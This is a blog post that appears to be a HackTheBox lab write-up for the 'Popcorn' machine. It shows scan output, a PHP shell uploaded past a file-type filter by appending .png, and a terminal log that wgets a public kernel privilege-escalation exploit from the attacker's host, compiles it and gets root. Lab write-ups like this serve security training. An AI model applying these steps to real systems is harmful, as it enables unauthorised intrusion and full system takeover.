---
layout: post
title:  "HTB Popcorn Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---

# Nmap scan
```
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# Dirsearch results
```
[06:17:51] 200 -  177B  - /
[06:17:52] 200 -  177B  - /index
[06:18:00] 200 -   48KB - /test
[06:18:28] 301 -  310B  - /torrent  ->  http://10.10.10.6/torrent/
[06:19:31] 301 -  309B  - /rename  ->  http://10.10.10.6/rename/
```

# Webapp things
'/torrent' from the directory bruteforce looks interesting, it directs to a torrent hosting site. There is capability to upload files but we cant due to being unauthenticated. Luckily theres also a signup form so we can be authenticated.
Attempting a straight file upload with a php shell and typical bypasses didnt end up working out. Since the name mentions torrents, i tried a torrent file such as the default kali torrent. This file works just fine. After uploading theres an option to upload an image along with the file. This time appending .png to our php shell allows us to get a connection once we navigate to '/torrent/uploads'


# Getting root
Digging around searchsploit and exploitdb for a kernel exploit was an idea because the kernel is dated as 2009. 
```
“Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation”
``` 
Use wget on the box to get the file, compile and execute to gain root.
```
www-data@popcorn:/dev/shm$ wget http://10.10.14.6:8000/15704.c
wget http://10.10.14.6:8000/15704.c
--2018-12-04 13:35:08--  http://10.10.14.6:8000/15704.c
Connecting to 10.10.14.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9487 (9.3K) [text/plain]
Saving to: `15704.c'

100%[======================================>] 9,487       36.7K/s   in 0.3s    

2018-12-04 13:35:08 (36.7 KB/s) - `15704.c' saved [9487/9487]

www-data@popcorn:/dev/shm$ gcc 15704.c -o fml 
gcc 15704.c -o fml
www-data@popcorn:/dev/shm$ chmod +x fml
chmod +x fml
www-data@popcorn:/dev/shm$ file fml
file fml
fml: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
www-data@popcorn:/dev/shm$ ./fml
./fml
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf840a280
 [+] Resolved econet_ops to 0xf840a360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# cat /root/root.txt
cat /root/root.txt
<redacted>
# 
```

aaaaand done.
